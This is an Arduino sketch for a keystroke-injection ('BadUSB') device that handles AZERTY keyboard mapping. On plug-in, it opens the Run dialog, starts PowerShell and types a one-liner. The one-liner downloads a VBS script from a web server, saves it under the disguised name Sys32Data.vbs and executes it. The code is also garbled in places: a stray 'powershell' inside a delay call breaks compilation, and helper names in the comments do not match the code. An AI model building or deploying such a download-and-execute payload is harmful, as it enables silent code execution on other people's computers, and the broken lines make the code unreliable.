// $ -> keyboardScanCode(48);
// ' -> keyboardScanCode(33);
// \ -> printCA(37);
// [ -> printCA(1,34);
// ] -> printCA(1,45);
// { -> printCA(1,33);
// } -> printCA(1,46);
// | -> printCA(1,35);
// > -> printMaj(1,100);
// < -> keyboardScanCode(100);


#include <Keyboard.h>

void pressKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{
  Serial.begin(9600);
  Keyboard.begin();

  //delay for debugging and safety
  delay(1powershell
  000);

  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(200);
  Keyboardprint("powershell");
  delay(500);
  pressKey(KEY_RETURN);
  delay(1000);

  //exemple to download a vbs script from a web-server
  Keyboardprint("$client = new-object System.Net.WebClient;$client.DownloadFile(\"http://192.168.0.120:8080/test.txt\",\"Sys32Data.vbs\");Start .\\Sys32Data.vbs;exit");
  delay(300);
  pressKey(KEY_RETURN);

  Keyboard.end();
}

String fr2en(char text) //azerty to qwerty keyboard, found here: https://dyrk.org/2018/12/09/arduino-simuler-un-clavier-azerty/
{
  int i = 0;
  String _en = " =qwertyuiopasdfghjkl;zxcvbnQWERTYUIOPASDFGHJKL:ZXCVBNm,./M<>?1234567890!@#$%^&*()\"-",
         _fr = " =azertyuiopqsdfghjklmwxcvbnAZERTYUIOPQSDFGHJKLMWXCVBN,;:!?./ & \"'(- _  1234567890%)",
         str = "";
  str = str + (String)_en[_fr.indexOf((String)text)];
  return str;
}

void Keyboardprint(String text)
{
 // text=fr2en(text);
  int n=text.length();
  for(int i=0;i<n;i++)
  {
      if(text[i]=='$')
      {
        keyboardScanCode(48);
      }
      else if(text[i]=='\'')
      {
        keyboardScanCode(33);
      }
      else if(text[i]=='\\')
      {
        printAG(1,37);
      }
      else if(text[i]=='[')
      {
        printAG(1,34);
      }
      else if(text[i]==']')
      {
        printAG(1,45);
      }
      else if(text[i]=='{')
      {
        printAG(1,33);
      }
      else if(text[i]=='}')
      {
        printAG(1,46);
      }
      else if(text[i]=='|')
      {
        printAG(1,35);
      }
      else if(text[i]=='>')
      {
        printMaj(1,100);
      }
      else if(text[i]=='<')
      {
        keyboardScanCode(100);
      }
      else if (text[i]=='+')
      {
        printMaj(1,46);
      }
      else
      {
        String c=fr2en(text[i]);
        Keyboard.print(c);
      }  
  }
  
}

void keyboardScanCode(byte code) //to press special key like '\', found here: https://forum.arduino.cc/t/keyboard-h-et-antislash/565172/3 (thanks to nico78)
{  
  Keyboard.press(code+136);  
  delay(4);  
  Keyboard.release(code+136);  
  delay(4); 
}

void printAG(int n, int s) 
{    
  for (int i=0;i<n;i++)
  {
    Keyboard.press(KEY_RIGHT_ALT);  
    keyboardScanCode(s);  
    Keyboard.release(KEY_RIGHT_ALT);  
  }
}

void printMaj(int n, int s)
{
  for (int i=0;i<n;i++)
  {
    Keyboard.press(KEY_LEFT_SHIFT);  
    keyboardScanCode(s);  
    Keyboard.release(KEY_LEFT_SHIFT);  
  }
}



void loop() {}
